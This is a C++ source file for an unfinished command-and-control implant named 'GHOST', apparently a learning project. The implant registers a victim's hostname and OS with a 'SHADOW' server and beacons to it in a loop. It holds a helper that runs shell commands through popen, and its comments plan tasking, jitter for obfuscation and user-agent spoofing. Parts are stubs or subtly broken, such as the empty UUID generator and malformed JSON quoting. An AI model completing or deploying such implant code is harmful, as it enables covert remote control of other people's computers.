#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <array>
#include <cstring>
#include <memory>

// cross platform macros
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")

    #define SOCKET_TYPE SOCKET
    #define IS_VALID_SOCKET(s) (s != INVALID_SOCKET)
    #define CLOSE_SOCKET closesocket
    #define LAST_ERROR WSAGetLastError()

    #define POPEN _popen
    #define PCLOSE _pclose

    const std::string OS_PLATFORM = "windows";
    const int SLEEP_MULTIPLIER = 1000;
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <netdb.h>

    #define SOCKET_TYPE int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define IS_VALID_SOCKET(s) (s >= 0)
    #define CLOSE_SOCKET close
    #define LAST_ERROR errno

    #define POPEN popen
    #define PCLOSE pclose
    
    const std::string OS_PLATFORM = "linux";
    const int SLEEP_MULTIPLIER = 1;
#endif

// === CONFIG ====
const std::string SHADOW_IP = "127.0.0.1";  // TODO: parametrize this while building
const int SHADOW_PORT = 9999;
const int BUFFER_SIZE = 4096;

namespace Utils {
    std::string getJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);
        
        if (startPos == std::string::npos) return "";

        startPos += search.length();

        while (startPos < json.length() && (json[startPos] == ' ' || json[startPos] == ':')) {
            startPos++;
        }

        if (json[startPos] == '"') {    // string
            size_t startQuote = startPos;
            size_t endQuote = json.find("\"", startQuote + 1);

            if (endQuote == std::string::npos) {
                return "";
            }

            return json.substr(startQuote + 1, endQuote - startQuote - 1);
        } else {    // num or bool
            size_t endPos = json.find_first_of(",}", startPos);

            if (endPos == std::string::npos) {
                return "";
            }

            return json.substr(startPos, endPos - startPos);
        }
    }

    std::string jsonEscape(const std::string& json) {
        std::string output;

        for (char c : json) {
            switch (c) {
                case '"': output += "\\\""; break;
                case '\\': output += "\\\\"; break;
                case '\b': output += "\\b"; break;
                case '\f': output += "\\f"; break;
                case '\n': output += "\\n"; break;
                case '\r': output += "\\r"; break;
                case '\t': output += "\\t"; break;
                default: output += c; break;
            }
        }

        return output;
    }

    std::string executeCommand(const std::string& command) {
        std::array<char, 128> buffer;
        std::string result;
        std::string fullCommand = command + " 2>&1";    // i've read it's generally good practice to redirect stderr in these kinds of implants

        FILE* pipe = POPEN(fullCommand.c_str(), "r");
        if (!pipe) {
            return "ERROR opening pipe";
        }

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }

        PCLOSE(pipe);

        return result;
    }

    std::string getHostname() {
        char hostname[1024];

        if (gethostname(hostname, 1024) == 0) {
            return std::string(hostname);
        }

        return "unknown";
    }

    // TODO: code from https://antonz.org/uuidv7/#cpp by Anton Zhiyanov
    // TODO: modified to return string instead
    std::string generateUuid() {
        return "";
    }
}


// we're using a raw socket http client to not use external libraries, will see how it goes
class HttpClient {
private: 
    std::string host;
    int port;

    void initializeNetwork() {
        #ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        #endif
    }
public:
    HttpClient(std::string h, int p) : host(h), port(p) {
        initializeNetwork();
    }

    ~HttpClient() {
        #ifdef _WIN32
        WSACleanup();
        #endif
    }

    std::string sendHttpRequest(const std::string& method, const std::string& uri, const std::string& body = "") {
        SOCKET_TYPE sock = socket(AF_INET, SOCK_STREAM, 0); // we only support ipv4 for the foreseeable future; SOCK_STREAM = TCP, SOCK_DGRAM = UDP
        if (!IS_VALID_SOCKET(sock)) return "";

        // prepare connection
        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            CLOSE_SOCKET(sock);
            return "";  // silent error the default in implants
        }

        // prepare request data
        std::stringstream req;
        req << method << " " << uri << " HTTP/1.1\r\n";
        req << "Host: " << host << "\r\n";
        req << "Connection: close\r\n";
        req << "User-Agent: GHOST\r\n"; // consider user agent spoofing as a configurable option

        if (!body.empty()) {
            req << "Content-Type: application/json\r\n";
            req << "Content-Length: " << body.length() << "\r\n";
        }

        req << "\r\n";

        if (!body.empty()) {
            req << body;
        }

        // send request
        send(sock, req.str().c_str(), req.str().length(), 0);

        // wait for response
        std::string response;
        char buffer[4096];
        int bytesReceived;

        while ((bytesReceived = recv(sock, buffer, 4096 - 1, 0)) > 0) {
            buffer[bytesReceived] = '\0';
            response += buffer;
        }

        CLOSE_SOCKET(sock);

        // check what's been received (strip headers for now)
        size_t bodyPos = response.find("\r\n\r\n");
        if (bodyPos != std::string::npos) {
            return response.substr(bodyPos + 4);
        }

        return "";
    }
};

class Ghost {
private:
    std::string uuid;
    std::string hostname;

    HttpClient client;
    int sleepInterval;
public:
    // a potential problem with UUID arises if the implant gets reinstalled
    // it'll cause it to generate a new uuid
    // SHADOW won't know it's the same one
    // TODO: how to combat this?
    Ghost(std::string ip, int port, int sleepInterval = 60) : uuid(Utils::generateUuid()), hostname(Utils::getHostname()), client(ip, port), sleepInterval(sleepInterval) {}

    bool registerGhost() {
        std::cout << "[GHOST] trying to register with SHADOW\n";
        
        std::stringstream json;
        json << "{"
            << "\"id\":" << uuid << "\","
            << "\"hostname\":" << hostname << "\","
            << "\"os\":" << OS_PLATFORM << "\","
            << "\"last_seen\":0"
            << "}";

        std::string response = client.sendHttpRequest("POST", "/ghost", json.str());

        // TODO: ideally get back some sort of a config, but for now just get any data
        // TODO: make this check the reponse code instead
        if (!response.empty()) {
            std::cout << "REGISTRATION SUCCESSFUL\n";

            return true;
        }

        return false; 
    }

    void beacon() {
        std::cout << "[GHOST] starting the beacon\n";

        while (true) {
            std::cout << "[beacon] pulse sent\n";
            
            // poll for task
            // parse the data
            // execute received commands
            // send back result
            // sleep until next pulse

            // TODO: jitter for obfuscation
            sleep(5 * SLEEP_MULTIPLIER);
        }
    }
};

int main() {
    std::cout << "GHOST UP on \"" << OS_PLATFORM << "\"" << std::endl;

    // create itself
    // TODO: think through the oop approach
    // will need to see real implants to know how it should be done
    // this one is mainly for testing
    Ghost ghost(SHADOW_IP, SHADOW_PORT);

    // try to register with SHADOW
    while (!ghost.registerGhost()) {
        sleep(5 * SLEEP_MULTIPLIER);
    }

    // for now just beacon
    ghost.beacon();

    return 0;
}
